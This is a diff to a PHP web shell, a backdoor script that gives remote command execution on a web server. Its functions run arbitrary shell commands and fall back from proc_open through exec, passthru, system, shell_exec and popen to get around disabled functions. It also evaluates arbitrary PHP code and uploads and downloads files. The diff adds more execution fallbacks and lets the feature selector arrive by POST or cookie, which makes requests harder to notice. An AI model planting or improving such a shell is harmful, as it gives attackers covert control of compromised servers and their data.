@@ -1,63 +1,169 @@
 <?php
 
 function featureShell($cmd, $cwd) {
-    static $disable_functions;
-    if (!isset($disable_functions)) {
-        $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
-    }
-    $stdout = array();
+    $return = '';
+    $stdout = '';
+    $stderr = '';
+    $status = '';
     $changed = null;
-
     if (preg_match("/^\s*cd\s*$/", $cmd)) {
         // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
-        $changed = [];
+        $changed = array();
         $changed[] = chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         $changed[] = chdir($match[1]);
     } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
-        $changed = chdir($cwd);
+        $changed = array();
+        $changed[] = chdir($cwd);
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
         return featureDownload($match[1]);
     } else {
         $changed = chdir($cwd);
+        static $disable_functions;
+        if (!isset($disable_functions)) {
+            $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
+        }
         if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
-            $descriptorspec = [
-                1 => ['pipe', 'w'],
-                2 => ['pipe', 'w']
-            ];
-            $pipes = [];
+            $descriptorspec = array(
+                1 => array('pipe', 'w'),
+                2 => array('pipe', 'w')
+            );
+            $pipes = array();
             $proc = proc_open($cmd, $descriptorspec, $pipes);
-            $stdout = stream_get_contents($pipes[1]);
+            if (function_exists('stream_get_contents')) {
+                $stdout = stream_get_contents($pipes[1]);
+            }
             fclose($pipes[1]);
-            $stderr = stream_get_contents($pipes[2]);
+            if (function_exists('stream_get_contents')) {
+                $stderr = stream_get_contents($pipes[2]);
+            }
             fclose($pipes[2]);
-            $errorlevel = proc_close($proc);
+            if ($proc === false) {
+                $status = 1;
+            }
+            if (function_exists('proc_close')) {
+                $status = proc_close($proc);
+            }
             if ($stdout === "\x0d\x1b\x5b\x30\x4b\x0a") {
                 $stdout = '';
             }
+            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+                $stdout = 'status='.$status;
+                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
+                    $stdout .= ' | '.'stderr='.$stderr;
+                }
+            }
         } elseif (function_exists('exec') && is_callable('exec') && !isset($disable_functions['exec'])) {
-            exec($cmd, $stdout);
+            $stdout = array();
+            try {
+                $return = exec($cmd, $stdout, $status);
+            } catch (\Exception $e) {
+                $stderr = $e->getMessage();
+                $status = $e->getCode();
+            }
+            if (is_array($stdout)) {
+                $stdout = implode(PHP_EOL, $stdout);
+            }
+            if (!is_numeric($status)) {
+                if ($return !== false) {
+                    $status = 0;
+                } elseif ($return === false) {
+                    $status = 1;
+                }
+            }
+            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+                $stdout = 'status='.$status;
+                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
+                    $stdout .= ' | '.'stderr='.$stderr;
+                }
+            }
+        } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
+            if (function_exists('ob_start')) {
+                ob_start();
+            }
+            try {
+                $return = passthru($cmd, $status);
+            } catch (\Exception $e) {
+                $stderr = $e->getMessage();
+                $status = $e->getCode();
+            }
+            if (!is_numeric($status)) {
+                if ($return === null) {
+                    $status = 0;
+                } elseif ($return === false) {
+                    $status = 1;
+                }
+            }
+            if (function_exists('ob_get_clean')) {
+                $stdout = ob_get_clean();
+            }
+            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+                $stdout = $return;
+            }
+            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+                $stdout = 'status='.$status;
+                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
+                    $stdout .= ' | '.'stderr='.$stderr;
+                }
+            }
+        } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
+            if (function_exists('ob_start')) {
+                ob_start();
+            }
+            try {
+                $return = system($cmd, $status);
+            } catch (\Exception $e) {
+                $stderr = $e->getMessage();
+                $status = $e->getCode();
+            }
+            if (!is_numeric($status)) {
+                if ($return !== false) {
+                    $status = 0;
+                } elseif ($return === false) {
+                    $status = 1;
+                }
+            }
+            if (function_exists('ob_get_clean')) {
+                $stdout = ob_get_clean();
+            }
+            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+                $stdout = $return;
+            }
+            if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+                $stdout = 'status='.$status;
+                if ($stderr !== '' && $stderr !== array() && $stderr !== false && $stderr !== null) {
+                    $stdout .= ' | '.'stderr='.$stderr;
+                }
+            }
         } elseif (function_exists('shell_exec') && is_callable('shell_exec') && !isset($disable_functions['shell_exec'])) {
             $stdout = shell_exec($cmd);
-        } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
-            ob_start();
-            system($cmd);
-            $stdout = ob_get_clean();
-        } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
-            ob_start();
-            passthru($cmd);
-            $stdout = ob_get_clean();
-        }
-        if (is_string($stdout)) {
-            $stdout = explode(PHP_EOL, $stdout);
+        } elseif (function_exists('popen') && is_callable('popen') && !isset($disable_functions['popen'])) {
+            $handle = popen($cmd, 'r');
+            if (function_exists('feof') && function_exists('fread')) {
+                while (!feof($handle)) {
+                    $stdout .= fread($handle, 4096);
+                }
+            }
+            if (function_exists('pclose')) {
+                pclose($handle);
+            }
+        } else {
+            $stdout = 'Else';
         }
     }
-
+    if (is_string($stdout)) {
+        $stdout = explode(PHP_EOL, $stdout);
+    }
+    if (!is_array($stdout)) {
+        $stdout = array();
+    }
     return array(
-        "stdout" => $stdout,
-        "cwd" => getcwd(),
-        "changed" => $changed,
+        'cwd' => getcwd(),
+        'stdout' => $stdout,
+        'stderr' => $stderr,
+        'status' => $status,
+        'changed' => $changed,
     );
 }
 
@@ -66,55 +172,164 @@ function featurePwd() {
 }
 
 function featureHint($fileName, $cwd, $type) {
-    static $disable_functions;
-    if (!isset($disable_functions)) {
-        $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
-    }
-    $changed = chdir($cwd);
     if ($type == 'cmd') {
         $cmd = "compgen -c $fileName";
     } else {
         $cmd = "compgen -f $fileName";
     }
     $cmd = "/bin/bash -c \"$cmd\"";
+    $files = array();
+    $return = '';
     $stdout = '';
+    $stderr = '';
+    $status = '';
+    $changed = null;
+    $changed = array();
+    $changed[] = chdir($cwd);
+    static $disable_functions;
+    if (!isset($disable_functions)) {
+        $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
+    }
     if (function_exists('proc_open') && is_callable('proc_open') && !isset($disable_functions['proc_open'])) {
-        $descriptorspec = [
-            1 => ['pipe', 'w'],
-            2 => ['pipe', 'w']
-        ];
-        $pipes = [];
+        $descriptorspec = array(
+            1 => array('pipe', 'w'),
+            2 => array('pipe', 'w')
+        );
+        $pipes = array();
         $proc = proc_open($cmd, $descriptorspec, $pipes);
-        $stdout = stream_get_contents($pipes[1]);
+        if (function_exists('stream_get_contents')) {
+            $stdout = stream_get_contents($pipes[1]);
+        }
         fclose($pipes[1]);
-        $stderr = stream_get_contents($pipes[2]);
+        if (function_exists('stream_get_contents')) {
+            $stderr = stream_get_contents($pipes[2]);
+        }
         fclose($pipes[2]);
-        $errorlevel = proc_close($proc);
+        if ($proc === false) {
+            $status = 1;
+        }
+        if (function_exists('proc_close')) {
+            $status = proc_close($proc);
+        }
         if ($stdout === "\x0d\x1b\x5b\x30\x4b\x0a") {
             $stdout = '';
         }
     } elseif (function_exists('exec') && is_callable('exec') && !isset($disable_functions['exec'])) {
-        exec($cmd, $stdout);
+        $stdout = array();
+        try {
+            $return = exec($cmd, $stdout, $status);
+        } catch (\Exception $e) {
+            $stderr = $e->getMessage();
+            $status = $e->getCode();
+        }
+        if (is_array($stdout)) {
+            $stdout = implode(PHP_EOL, $stdout);
+        }
+        if (!is_numeric($status)) {
+            if ($return !== false) {
+                $status = 0;
+            } elseif ($return === false) {
+                $status = 1;
+            }
+        }
+    } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
+        if (function_exists('ob_start')) {
+            ob_start();
+        }
+        try {
+            $return = passthru($cmd, $status);
+        } catch (\Exception $e) {
+            $stderr = $e->getMessage();
+            $status = $e->getCode();
+        }
+        if (!is_numeric($status)) {
+            if ($return === null) {
+                $status = 0;
+            } elseif ($return === false) {
+                $status = 1;
+            }
+        }
+        if (function_exists('ob_get_clean')) {
+            $stdout = ob_get_clean();
+        }
+        if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+            $stdout = $return;
+        }
+    } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
+        if (function_exists('ob_start')) {
+            ob_start();
+        }
+        try {
+            $return = system($cmd, $status);
+        } catch (\Exception $e) {
+            $stderr = $e->getMessage();
+            $status = $e->getCode();
+        }
+        if (!is_numeric($status)) {
+            if ($return !== false) {
+                $status = 0;
+            } elseif ($return === false) {
+                $status = 1;
+            }
+        }
+        if (function_exists('ob_get_clean')) {
+            $stdout = ob_get_clean();
+        }
+        if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+            $stdout = $return;
+        }
     } elseif (function_exists('shell_exec') && is_callable('shell_exec') && !isset($disable_functions['shell_exec'])) {
         $stdout = shell_exec($cmd);
-    } elseif (function_exists('system') && is_callable('system') && !isset($disable_functions['system'])) {
-        $stdout = system($cmd);
-    } elseif (function_exists('passthru') && is_callable('passthru') && !isset($disable_functions['passthru'])) {
-        $stdout = passthru($cmd);
+    } elseif (function_exists('popen') && is_callable('popen') && !isset($disable_functions['popen'])) {
+        $handle = popen($cmd, 'r');
+        if (function_exists('feof') && function_exists('fread')) {
+            while (!feof($handle)) {
+                $stdout .= fread($handle, 4096);
+            }
+        }
+        if (function_exists('pclose')) {
+            pclose($handle);
+        }
+    } else {
+        $stdout = 'Else';
     }
-    $files = explode("\n", $stdout);
+    if (is_string($stdout)) {
+        $files = explode("\n", $stdout);
+    }
+    if (!is_array($files)) {
+        $files = array();
+    }
     return array(
+        'cwd' => getcwd(),
         'files' => $files,
         'changed' => $changed,
+        'stderr' => $stderr,
+        'status' => $status,
     );
 }
 
 function featureDownload($filePath) {
+    $return = '';
+    $stdout = '';
+    $stderr = '';
+    $status = '';
+    $changed = null;
     $file = @file_get_contents($filePath);
-    if ($file === FALSE) {
+    if ($file === false) {
+        $error = error_get_last();
+        $stdout = array('File not found / no read permission.');
+        if (!empty($error['message'])) {
+            $stderr = $error['message'];
+        }
+        $status = 1;
+        if (!empty($error['type'])) {
+            $status = $error['type'];
+        }
         return array(
-            'stdout' => array('File not found / no read permission.'),
-            'cwd' => getcwd()
+            'cwd' => getcwd(),
+            'stdout' => $stdout,
+            'stderr' => $stderr,
+            'status' => $status,
         );
     } else {
         return array(
@@ -125,12 +340,29 @@ function featureDownload($filePath) {
 }
 
 function featureUpload($path, $file, $cwd) {
-    $changed = chdir($cwd);
+    $return = '';
+    $stdout = '';
+    $stderr = '';
+    $status = '';
+    $changed = null;
+    $changed = array();
+    $changed[] = chdir($cwd);
     $f = @fopen($path, 'wb');
-    if ($f === FALSE) {
+    if ($f === false) {
+        $error = error_get_last();
+        $stdout = array('Invalid path / no write permission.');
+        if (!empty($error['message'])) {
+            $stderr = $error['message'];
+        }
+        $status = 1;
+        if (!empty($error['type'])) {
+            $status = $error['type'];
+        }
         return array(
-            'stdout' => array('Invalid path / no write permission.'),
             'cwd' => getcwd(),
+            'stdout' => $stdout,
+            'stderr' => $stderr,
+            'status' => $status,
             'changed' => $changed,
         );
     } else {
@@ -153,13 +385,15 @@ function featureUpload($path, $file, $cwd) {
 }
 
 function featureEval($code, $cwd) {
-    $stdout = array();
+    $return = '';
+    $stdout = '';
+    $stderr = '';
+    $status = '';
     $changed = null;
-
     if (preg_match("/^\s*cd\s*$/", $code)) {
         // pass
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $code)) {
-        $changed = [];
+        $changed = array();
         $changed[] = chdir($cwd);
         preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
         $changed[] = chdir($match[1]);
@@ -168,26 +402,53 @@ function featureEval($code, $cwd) {
         preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $code, $match);
         return featureDownload($match[1]);
     } else {
-        $changed = chdir($cwd);
-        ob_start();
-        eval($code);
-        $stdout = ob_get_clean();
-        if (is_string($stdout)) {
-            $stdout = explode(PHP_EOL, $stdout);
+        $changed = array();
+        $changed[] = chdir($cwd);
+        if (function_exists('ob_start')) {
+            ob_start();
+        }
+        if (substr($code, 0, 5) === '<?php') {
+            $code = substr($code, 5);
+        } elseif (substr($code, 0, 2) === '<?') {
+            $code = substr($code, 2);
+        }
+        try {
+            error_clear_last();
+            $return = eval($code);
+        } catch (\Exception $e) {
+            $stderr = $e->getMessage();
+            $status = $e->getCode();
+        }
+        if (function_exists('ob_get_clean')) {
+            $stdout = ob_get_clean();
+        }
+        if ($stdout === '' || $stdout === array() || $stdout === false || $stdout === null) {
+            $stdout = $return;
         }
     }
-
+    if (is_string($stdout)) {
+        $stdout = explode(PHP_EOL, $stdout);
+    }
     return array(
-        "stdout" => $stdout,
-        "cwd" => getcwd(),
-        "changed" => $changed,
+        'cwd' => getcwd(),
+        'stdout' => $stdout,
+        'stderr' => $stderr,
+        'status' => $status,
+        'changed' => $changed,
     );
 }
 
-if (isset($_GET["feature"])) {
+$input_feature = null;
+if (!empty($_POST['feature'])) {
+    $input_feature = $_POST['feature'];
+} elseif (!empty($_COOKIE['feature'])) {
+    $input_feature = $_COOKIE['feature'];
+} elseif (!empty($_GET['feature'])) {
+    $input_feature = $_GET['feature'];
+}
 
+if (!empty($input_feature)) {
     $response = NULL;
-
     switch ($_GET["feature"]) {
         case "shell":
             $cmd = $_POST['cmd'];
@@ -210,7 +471,6 @@ if (isset($_GET["feature"])) {
             $response = featureEval($code, $_POST["cwd"]);
             break;
     }
-
     header("Content-Type: application/json");
     echo json_encode($response);
     die();
